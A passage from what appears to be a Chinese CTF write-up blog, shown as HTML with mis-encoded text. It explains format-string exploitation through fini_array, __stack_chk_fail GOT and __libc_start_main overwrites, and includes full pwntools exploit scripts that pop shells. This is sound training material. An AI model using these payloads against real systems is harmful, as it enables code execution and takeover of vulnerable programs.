data-src="/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/capture_20240927141831603.bmp"></p><ul><li>å¯ä»¥å‘ç°æ‰§è¡Œå®Œmainå‡½æ•°ä¹‹åä¼šæ‰§è¡Œä¸€ä¸ªç»ˆæ­¢å‡½æ•°ï¼Œå¦‚æœæˆ‘ä»¬å¯ä»¥æ”¹ç»ˆæ­¢å‡½æ•°ä¸ºmainå‡½æ•°åœ°å€ï¼Œé‚£æ˜¯ä¸æ˜¯å°±å¯ä»¥åˆå†æ¬¡å›ç­”mainå‡½æ•°ï¼Ÿç­”æ¡ˆæ˜¯è‚¯å®šçš„ï¼Œæ­¤é¢˜ç›®æ²¡æœ‰PIEã€‚</li><li>ä¸‹å›¾ç¬¬ä¸€ä¸ªçº¢æ¡†å°±æ˜¯mainå‡½æ•°å‰è¦æ‰§è¡Œçš„åˆå§‹åŒ–å‡½æ•°ï¼Œè€Œç¬¬äºŒä¸ªçº¢æ¡†å°±æ˜¯mainå‡½æ•°ç»“æŸä¹‹åè¦æ‰§è¡Œçš„ç»ˆæ­¢å‡½æ•°ï¼Œæˆ‘ä»¬è¦æ”¹çš„å°±æ˜¯è¿™ä¸ªå‡½æ•°å€¼</li></ul><p><img lazyload src="/images/loading.svg" data-src="/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/capture_20240927142246469.bmp"></p><h4 id="EXPè§£é‡Š"><a href="#EXPè§£é‡Š" class="headerlink" title="EXPè§£é‡Š"></a>EXPè§£é‡Š</h4><p><font size="4">ä¿®æ”¹åˆ†æï¼š</font></p><ul><li>fini_array -&gt; mainprintf -&gt; system</li><li>å¾ˆæ˜æ˜¾è¦å…ˆæ”¹é«˜ä½å­—èŠ‚ï¼Œå› ä¸ºå…ˆæ”¹å°çš„ï¼Œå†æ”¹å¤§çš„(%x$nçš„ç‰¹æ€§ï¼Œå‰é¢æœ‰å¤šå°‘ä¸ªå­—ç¬¦äº†å°±ä¿®æ”¹å¤šå°‘)</li></ul><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">printf     = <span class="number">0x0804</span> 989c</span><br><span class="line">system     = <span class="number">0x0804</span> 83D0</span><br><span class="line"></span><br><span class="line">fini_array = <span class="number">0x0804</span> 979C</span><br><span class="line">main       = <span class="number">0x0804</span> <span class="number">8534</span> </span><br></pre></td></tr></table></figure></div><p><font size="4">å®Œæ•´EXP</font></p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;node5.buuoj.cn&quot;,27343)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">printf     = <span class="number">0x0804989c</span></span><br><span class="line">system     = <span class="number">0x080483D0</span></span><br><span class="line"></span><br><span class="line">fini_array = <span class="number">0x0804979C</span></span><br><span class="line">main       = <span class="number">0x08048534</span> </span><br><span class="line"></span><br><span class="line"><span class="comment"># åç§»æ˜¯4</span></span><br><span class="line"><span class="comment"># æ”¹fini_array -&gt; main      printf -&gt; system </span></span><br><span class="line">payload = p32(fini_array+<span class="number">2</span>) + p32(printf+<span class="number">2</span>) + p32(printf) + p32(fini_array)</span><br><span class="line">payload += <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="number">0x804</span>-<span class="number">0x10</span>).encode() + <span class="string">b&#x27;c%4$hn&#x27;</span> + <span class="string">b&#x27;%5$hn&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="number">0x83D0</span> - <span class="number">0x804</span>).encode() + <span class="string">b&#x27;c%6$hn&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="number">0x8534</span> - <span class="number">0x83D0</span>).encode() + <span class="string">b&#x27;c%7$hn&#x27;</span></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.send(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div><h3 id="2-ä¿®æ”¹stack-chk-fail"><a href="#2-ä¿®æ”¹stack-chk-fail" class="headerlink" title="(2)ä¿®æ”¹stack_chk_fail"></a>(2)ä¿®æ”¹stack_chk_fail</h3><p>é¢˜ç›®æ¥è‡ªBaseCTF fmt3,å‚è€ƒäº†å®˜æ–¹é¢˜è§£</p><h4 id="idaé€Ÿè§ˆ-1"><a href="#idaé€Ÿè§ˆ-1" class="headerlink" title="idaé€Ÿè§ˆ"></a>idaé€Ÿè§ˆ</h4><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">256</span>]; <span class="comment">// [rsp+0h] [rbp-110h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+108h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  init();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;-----&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x110</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(buf);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><ul><li>å¾ˆæ˜æ˜¾çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´åˆ©ç”¨ï¼Œä½†æ˜¯æ— æ³•æ ˆæº¢å‡ºåˆ°è¿”å›åœ°å€ã€‚</li></ul><h4 id="åˆ©ç”¨åˆ†æ-1"><a href="#åˆ©ç”¨åˆ†æ-1" class="headerlink" title="åˆ©ç”¨åˆ†æ"></a>åˆ©ç”¨åˆ†æ</h4><ul><li>æˆ‘ä»¬æ²¡æœ‰systemå’Œ&#x2F;bin&#x2F;shï¼Œå¾ˆæ˜æ˜¾æ˜¯éœ€è¦æ³„éœ²libcçš„ï¼Œæ³„éœ²libcå¾ˆç®€å•ï¼ŒåŒå¼€å¤´çš„64ä½åˆ©ç”¨ä¸€æ ·ï¼Œä½†æ˜¯ç„¶åçš„æ­¥éª¤æˆ‘ä»¬è¯¥å¦‚ä½•è¿›è¡Œå‘¢ï¼Ÿä¸€æ¬¡æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´åˆ©ç”¨è¡Œä¸è¡Œå‘¢ï¼Ÿ</li><li>å…¶å®å½“ç„¶æ˜¯ä¸è¡Œçš„ï¼Œå¦‚ä½•ä¿®æ”¹å¯ä»¥ä½¿å¾—å¤šæ¬¡åˆ©ç”¨å‘¢ï¼Ÿ<font color="red">canary!!!</font></li><li>canaryé˜»æ­¢äº†æˆ‘ä»¬è¿›è¡Œæ ˆæº¢å‡ºçš„åˆ©ç”¨ï¼Œä½†æ˜¯åŒæ—¶ä¹Ÿè¡ç”Ÿå‡ºäº†å¯¹äºå®ƒçš„æ”»å‡»æ‰‹æ³•ä»¥åŠåˆ©ç”¨ï¼Œ**__stack_chk_failçš„åˆ©ç”¨ã€‚**</li><li>å½“è¾“å…¥è¾¾åˆ°canaryçš„æ—¶å€™ï¼Œå‘ç”Ÿé”™è¯¯ï¼Œç³»ç»Ÿä¼šæ‰§è¡Œ__stack_chk_failå‡½æ•°ï¼Œç„¶åå¯¼è‡´é€€å‡ºç¨‹åºï¼Œå¦‚æœæˆ‘ä»¬ä¿®æ”¹è¯¥å‡½æ•°çš„gotè¡¨å†…å®¹ä¸ºmainå‡½æ•°çš„åœ°å€ï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¸»åŠ¨å»è§¦å‘è¿™ä¸ªå‡½æ•°ï¼Œæ˜¯ä¸æ˜¯å°±ä¼šè·³åˆ°mainå‡½æ•°äº†å‘¢ï¼Ÿç­”æ¡ˆå½“ç„¶æ˜¯ï¼šæ˜¯çš„ï¼ï¼ï¼</li><li>æ‰€ä»¥æ€è·¯å¾ˆæ˜æ˜¾äº†ï¼Œå…ˆå°†stack_chk_failçš„gotæ”¹ä¸ºmainå‡½æ•°çš„åœ°å€ï¼Œå¹¶ä¸”æ³„éœ²libcï¼Œç¬¬äºŒæ¬¡å°†printf_gotä¿®æ”¹ä¸ºsystemï¼Œç¬¬ä¸‰æ¬¡ä¼ å…¥&#x2F;bin&#x2F;shå°±è¡Œäº†ï¼Œä½†æ˜¯è®°ä½ï¼Œè¦ä¸»åŠ¨å»è§¦å‘__stack_chk_failå‡½æ•°æ‰ä¼šè¿”å›åˆ°mainå‡½æ•°ã€‚</li></ul><h4 id="EXP-è§£é‡Š"><a href="#EXP-è§£é‡Š" class="headerlink" title="EXP&amp;è§£é‡Š"></a>EXP&amp;è§£é‡Š</h4><h5 id="1-ä¿®æ”¹-stack-chk-failå‡½æ•°gotè¡¨ï¼Œå¹¶ä¸”æ³„éœ²libc"><a href="#1-ä¿®æ”¹-stack-chk-failå‡½æ•°gotè¡¨ï¼Œå¹¶ä¸”æ³„éœ²libc" class="headerlink" title="1.ä¿®æ”¹__stack_chk_failå‡½æ•°gotè¡¨ï¼Œå¹¶ä¸”æ³„éœ²libc"></a>1.ä¿®æ”¹__stack_chk_failå‡½æ•°gotè¡¨ï¼Œå¹¶ä¸”æ³„éœ²libc</h5><ul><li>æ ¹æ®idaåœ°å€åˆ†æï¼Œåªéœ€è¦è¿›è¡Œä¸‰æ¬¡çš„å•å­—èŠ‚ä¿®æ”¹å³å¯ã€‚åç§»æ˜¯6ï¼Œ22 &#x3D; 0x10 + 6,0x10çš„åç§»åœ¨æ ˆä¸Šè¡¨ç¤ºä¸º0x10*8 &#x3D; 0x80ï¼Œæ‰€ä»¥å¯¹åç§»ä¸º22çš„åœ°æ–¹è¿›è¡Œå•å­—èŠ‚ä¿®æ”¹ï¼Œå°†åç§»ä¸º22çš„åœ°æ–¹å†™å…¥è¦ä¿®æ”¹çš„å³å¯ã€‚</li><li>å…¶ä¸­çš„<strong>0x100 - ä¸Šæ¬¡å·²ç»å†™å…¥çš„å­—ç¬¦æ•° + æœ¬æ¬¡åº”è¯¥å†™å…¥çš„å­—ç¬¦æ•°</strong>ï¼Œä¸ªäººè®¤ä¸ºåº”è¯¥æ˜¯<font color="red">é˜²æ­¢å‡ºç°è´Ÿæ•°çš„æƒ…å†µï¼Œä¹Ÿç®—æ˜¯å­¦åˆ°äº†æ–°çš„å†™æ³•äº†ã€‚</font></li></ul><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">stack_chk_fail = <span class="number">0x0403320</span></span><br><span class="line">main      =      <span class="number">0x040121B</span> </span><br><span class="line">payload = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="number">0x1b</span>).encode() + <span class="string">b&#x27;c%22$hhn&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="number">0x100</span>-<span class="number">0x1b</span>+<span class="number">0x12</span>).encode() + <span class="string">b&#x27;c%23$hhn&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="number">0x100</span>-<span class="number">0x12</span>+<span class="number">0x40</span>).encode() + <span class="string">b&#x27;c%24$hhn&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;---b%25$s&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x80</span>,<span class="string">b&#x27;a&#x27;</span>) </span><br><span class="line">payload += p64(stack_chk_fail)     <span class="comment"># 22</span></span><br><span class="line">payload += p64(stack_chk_fail+<span class="number">1</span>)   <span class="comment"># 23</span></span><br><span class="line">payload += p64(stack_chk_fail+<span class="number">2</span>)   <span class="comment"># 24</span></span><br><span class="line">payload += p64(printf_got)         <span class="comment"># 25</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x110</span>,<span class="string">b&#x27;a&#x27;</span>)<span class="comment"># ä¸»åŠ¨è§¦å‘stack_chk_fail</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;---b&#x27;</span>)</span><br><span class="line">printf_addr = u64(p.recv(<span class="number">6</span>)+<span class="string">b&#x27;\x00\x00&#x27;</span>)</span><br><span class="line">success(<span class="string">&quot;printf_address : &quot;</span>+<span class="built_in">hex</span>(printf_addr))</span><br><span class="line">base = printf_addr - libc.sym[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">system = base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br></pre></td></tr></table></figure></div><h5 id="2-ä¿®æ”¹printf-got-systemï¼Œä¼ å…¥-bin-sh"><a href="#2-ä¿®æ”¹printf-got-systemï¼Œä¼ å…¥-bin-sh" class="headerlink" title="2.ä¿®æ”¹printf_got &#x3D;&gt; systemï¼Œä¼ å…¥&#x2F;bin&#x2F;sh"></a>2.ä¿®æ”¹printf_got &#x3D;&gt; systemï¼Œä¼ å…¥&#x2F;bin&#x2F;sh</h5><ul><li>ä¿®æ”¹æ­¥éª¤å’Œä¸Šè¿°æ²¡åŒºåˆ«</li></ul><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(system &amp; <span class="number">0xff</span>).encode() + <span class="string">b&#x27;c%22$hhn&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>((<span class="number">0x100</span> - system&amp;<span class="number">0xff</span>)+(system &gt;&gt; <span class="number">8</span> &amp; <span class="number">0xff</span>)).encode() + <span class="string">b&#x27;c%23$hhn&#x27;</span></span><br><span class="line">payload += <span class="string">b&quot;%&quot;</span> + <span class="built_in">str</span>((<span class="number">0x100</span> - (((system &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xff</span>))) + (((system &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xff</span>))).encode() + <span class="string">b&quot;c%24$hhn&quot;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x80</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload += p64(printf_got)</span><br><span class="line">payload += p64(printf_got + <span class="number">1</span>)</span><br><span class="line">payload += p64(printf_got + <span class="number">2</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x110</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">sleep(<span class="number">0.3</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.3</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div><h1 id="éæ ˆä¸Šæ ¼å¼åŒ–å­—ç¬¦ä¸²"><a href="#éæ ˆä¸Šæ ¼å¼åŒ–å­—ç¬¦ä¸²" class="headerlink" title="éæ ˆä¸Šæ ¼å¼åŒ–å­—ç¬¦ä¸²"></a>éæ ˆä¸Šæ ¼å¼åŒ–å­—ç¬¦ä¸²</h1><h4 id="é¢˜ç›®ï¼š"><a href="#é¢˜ç›®ï¼š" class="headerlink" title="é¢˜ç›®ï¼š"></a>é¢˜ç›®ï¼š</h4><ul><li><font size4>NSSCTF 3rd <strong>ezfmt</strong></font></li></ul><p>å…ˆæ¥çœ‹çœ‹é¢˜ç›®ï¼š</p><p><img lazyload src="/images/loading.svg" data-src="/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/%E9%A2%98%E7%9B%AEida.bmp"></p><h4 id="æ€è·¯ï¼š"><a href="#æ€è·¯ï¼š" class="headerlink" title="æ€è·¯ï¼š"></a>æ€è·¯ï¼š</h4><ul><li>é¢˜ç›®å¾ˆæ˜æ˜¾ï¼Œç»™ä½ 7æ¬¡åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´çš„æœºä¼šï¼Œè®©ä½ getshellï¼Œå¯æ˜¯æˆ‘ä»¬å‘ç°<strong>bufæ˜¯åœ¨bssæ®µä¸Šé¢çš„</strong>ï¼Œä¸åŒäºåœ¨æ ˆä¸Šçš„åˆ©ç”¨ï¼Œåœ¨æ ˆä¸Šï¼Œæˆ‘ä»¬é€šå¸¸æ˜¯<strong>ä¿®æ”¹printf_gotä¸ºsystemåœ°å€</strong>ï¼Œç„¶åé€šè¿‡ä¼ å…¥&#x2F;bin&#x2F;sh,è¾¾åˆ°getshellçš„ç›®çš„ï¼Œå¯æ˜¯æ­¤å¤„ï¼Œæˆ‘ä»¬ä¸å¯ä»¥ã€‚</li><li>ä¸ºä»€ä¹ˆï¼Ÿå› ä¸ºéæ ˆä¸Šçš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´çš„åˆ©ç”¨éœ€è¦æˆ‘ä»¬è‡ªå·±å»æ‰‹åŠ¨å†™payloadï¼Œä¸åƒéæ ˆä¸Šæœ‰fmtstr_payloadè¿™ç§å·¥å…·å¸®æˆ‘ä»¬ä¿®æ”¹ï¼Œå› æ­¤ï¼Œæˆ‘ä»¬æ‰‹æ“ä¿®æ”¹å°±è¦ä¸€ç›´ç”¨åˆ°æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œé‚£ä¹ˆè¿™ä¸ªprintfå°±æ— æ³•æ›´æ”¹ï¼Œé‚£æˆ‘ä»¬å¯ä»¥ä¿®æ”¹ä»€ä¹ˆå‘¢?</li><li><font size="4" color="red"><strong>ä¿®æ”¹__libc_start_main</strong></font></li><li><strong>__libc_start_mainç›¸å½“äºå‡½æ•°çš„è¿”å›åœ°å€</strong>ï¼Œå½“ç¨‹åºç»“æŸçš„æ—¶å€™ä¼šæ‰§è¡Œå®ƒï¼Œæˆ‘ä»¬å¯ä»¥å°†å®ƒä¿®æ”¹ä¸ºonegadgetï¼Œç„¶åå°±å¯ä»¥getshelläº†ï¼Œä¸‹é¢è¯´è¯´å¦‚ä½•ä¿®æ”¹ã€‚</li></ul><h4 id="ä¿®æ”¹æ ¸å¿ƒï¼š"><a href="#ä¿®æ”¹æ ¸å¿ƒï¼š" class="headerlink" title="ä¿®æ”¹æ ¸å¿ƒï¼š"></a>ä¿®æ”¹æ ¸å¿ƒï¼š</h4><ul><li>éæ ˆä¸Šçš„ä¿®æ”¹éœ€è¦æˆ‘ä»¬<fron size="4" color="red"><strong>é—´æ¥å†™+æ— ä¸­ç”Ÿå‹</strong></fron></li></ul><p>æˆ‘ä»¬è¦æ‰¾åˆ° <font color="red"><strong>åœ°å€a -&gt; åœ°å€b -&gt; ç›®æ ‡åœ°å€</strong>ï¼Œè¿™æ ·çš„æ ¼å¼ã€‚</font></p><p><strong>å› ä¸ºä¿®æ”¹aå…¶å®æ˜¯ä¿®æ”¹c</strong></p><p>ä¸¾ä¸ªä¾‹å­ï¼š</p><p><font color="red"> ä¸ºäº†å¾—åˆ°A -&gt; B -&gt; C    Cä¸åœ¨æ ˆä¸Š</font></p><p><font color="red"> æœ‰ä¸€ä¸ªDè·ŸCçš„åœ°å€å¾ˆåƒï¼Œæˆ–è®¸å°±æœ«ä¸¤å­—èŠ‚ä¸ç›¸åŒ</font></p><p><font color="red">å€ŸåŠ©A -&gt; B -&gt; D ä¸”å·²çŸ¥åç§»çš„æƒ…å†µä¸‹</font></p><p><font color="red"> ä¿®æ”¹Aæœ«ä¸¤å­—èŠ‚ï¼Œå°±å¯ä»¥ä½¿å¾—B-&gt;Cã€‚</font></p><h4 id="é¢˜è§£ï¼š"><a href="#é¢˜è§£ï¼š" class="headerlink" title="é¢˜è§£ï¼š"></a>é¢˜è§£ï¼š</h4><ul><li>å…ˆæŸ¥çœ‹æ ˆç»“æ„ï¼Œæ‰¾åˆ° a-&gt;b-&gt;cçš„ç»“æ„ï¼Œé”å®šä¿®æ”¹çš„ç›®æ ‡ï¼š</li></ul><p><img lazyload src="/images/loading.svg" data-src="/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/capture_20240825183747991.bmp"></p><p>å¦‚å›¾ï¼Œä¸ºäº†ä¿®æ”¹__libc_start_mainï¼Œæˆ‘ä»¬é€‰å®šçš„ç»“æ„æ˜¯ä¸‹é¢ç”»æ¡†éƒ¨åˆ†ï¼Œå¯ä»¥å‘ç°ç”»æ¡†éƒ¨åˆ†çš„åœ°å€ï¼Œä¸libc_start_mainå‰é¢çš„åœ°å€ç›¸å·®ä¸å¤§ï¼Œæˆ‘ä»¬å°±æˆåŠŸåœ°æ‰¾åˆ°äº†â€æœ‹å‹â€</p><p><font color="red"> D - &gt; __libc_start_main</font></p><p><font color="red"> A -&gt; B -&gt; C ï¼Œä¿®æ”¹Cä¸ºD</font></p><p><font color="red"> A -&gt; B -&gt; D -&gt; __libc_start_main ,å†ä¿®æ”¹Bå°±å¯ä»¥è¾¾åˆ°ä¿®æ”¹libc_start_mainäº†</font></p><ul><li>æ¥ä¸‹æ¥å¯¹Bè€Œè¨€ï¼Œåˆšå¥½ä¹Ÿæ˜¯ä¸€ä¸ªa-&gt;b-&gt;cçš„ç»“æ„ï¼Œ<font color="red"><strong>B-&gt;D-&gt;libc_start_main</strong>,å¦‚æ­¤æˆ‘ä»¬ä¿®æ”¹Bå³ä¿®æ”¹ç¬¬ä¸‰ä¸ªæŒ‡é’ˆlibc_start_mainä¸ºonegadgetå³å¯getshell</font></li></ul><p><img lazyload src="/images/loading.svg" data-src="/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/capture_20240825184307134.bmp"></p><h4 id="æœ€ç»ˆexp"><a href="#æœ€ç»ˆexp" class="headerlink" title="æœ€ç»ˆexp"></a>æœ€ç»ˆexp</h4><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher3 <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;node8.anna.nssctf.cn&quot;,28175)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;/mnt/hgfs/ctfpwn/exp/libc/libc6_2.31-0ubuntu9.10_amd64.so&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ³„éœ²libcåŸºåœ°å€å’Œä¸€ä¸ªstackåœ°å€</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;&gt;\n&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;%9$p%11$p&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">libc_start_main= <span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)-<span class="number">243</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+][+][+][+] libc_start_main:&quot;</span>,<span class="built_in">hex</span>(libc_start_main))</span><br><span class="line"><span class="comment">#libc = LibcSearcher(&#x27;__libc_start_main&#x27;,libc_start_main)</span></span><br><span class="line">base = libc_start_main - libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">p.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">stack=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+][+][+][+] stack = &quot;</span>, <span class="built_in">hex</span>(stack))</span><br><span class="line"></span><br><span class="line">stack1 = stack - <span class="number">240</span> <span class="comment"># stack1 -&gt; libc_start_main</span></span><br><span class="line">stack2 = stack - <span class="number">224</span> <span class="comment"># stack2 -&gt; stack</span></span><br><span class="line">one = base + <span class="number">0xe3b01</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+][+][+][+] stack1 = &quot;</span>, <span class="built_in">hex</span>(stack1))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+][+][+][+] stack2 = &quot;</span>, <span class="built_in">hex</span>(stack2))</span><br><span class="line"></span><br><span class="line">pay=(<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(stack1&amp;<span class="number">0xffff</span>).encode()+<span class="string">b&#x27;c%11$hn&#x27;</span>).ljust(<span class="number">0x98</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(stack2)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;&gt;\n&#x27;</span>) </span><br><span class="line">p.sendline(pay)</span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line"></span><br><span class="line">pay=(<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(one&amp;<span class="number">0xffff</span>).encode()+<span class="string">b&#x27;c%39$hn&#x27;</span>).ljust(<span class="number">0x98</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(stack)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;&gt;\n&#x27;</span>)</span><br><span class="line">p.sendline(pay)</span><br><span class="line"> </span><br><span class="line">stack1+=<span class="number">2</span></span><br><span class="line">pay=(<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(stack1&amp;<span class="number">0xffff</span>).encode()+<span class="string">b&#x27;c%11$hn&#x27;</span>).ljust(<span class="number">0x98</span>,<span 